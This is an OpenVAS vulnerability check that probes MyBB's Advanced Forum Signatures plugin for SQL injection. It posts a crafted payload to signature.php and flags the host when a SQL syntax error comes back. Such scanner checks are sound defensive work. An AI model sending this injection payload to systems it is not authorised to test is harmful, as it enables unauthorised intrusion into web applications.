##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mybb_afsignatures_plugin_sql_inj_vuln.nasl 7006 2017-08-25 11:51:20Z teissa $
#
# MyBB Advanced Forum Signatures (afsignatures) Plugin 'signature.php' SQL Injection Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:mybb:mybb';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802039");
  script_version("$Revision: 7006 $");
  script_tag(name:"last_modification", value:"$Date: 2017-08-25 13:51:20 +0200 (Fri, 25 Aug 2017) $");
  script_tag(name:"creation_date", value:"2011-10-14 14:22:41 +0200 (Fri, 14 Oct 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("MyBB Advanced Forum Signatures (afsignatures) Plugin 'signature.php' SQL Injection Vulnerability");

  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17961");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/105661");
  script_xref(name : "URL" , value : "http://mods.mybb.com/view/advanced-forum-signatures");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("sw_mybb_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("MyBB/installed");

  script_tag(name : "impact" , value : "Successful exploitation will let attackers to manipulate SQL
  queries by injecting arbitrary SQL code and gain sensitive information.

  Impact Level: Application");
  script_tag(name : "affected" , value : "MyBB Advanced Forum Signatures (afsignatures) Plugin Version
  2.0.4, Other versions may also be affected.");
  script_tag(name : "insight" , value : "The flaw is due to input passed via multiple parameters to
  'signature.php', which is not properly sanitised before being
  used in a SQL query.");
  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name : "summary" , value : "This host is running MyBB with Advanced Forum Signatures
  (afsignatures) Plugin and is prone to SQL injection vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("global_settings.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if (dir == "/") dir = "";

## Path of Vulnerable Page
path2 = dir + "/signature.php";

## Post Data having attack data
postData = "afs_bar_right=postcount''SQLi;--";

## Construct POST Attack Request
req = http_post(item:path2, port:port, data:postData);

## Send crafted request and receive the response
res = http_send_recv(port:port, data:req);

## Confirm exploit worked by checking the response
if("MyBB has experienced an internal SQL error and cannot " +
   "continue." >< res && "You have an error in your SQL syntax" >< res)
{
  security_message(port:port);
  exit(0);
}

exit(99);
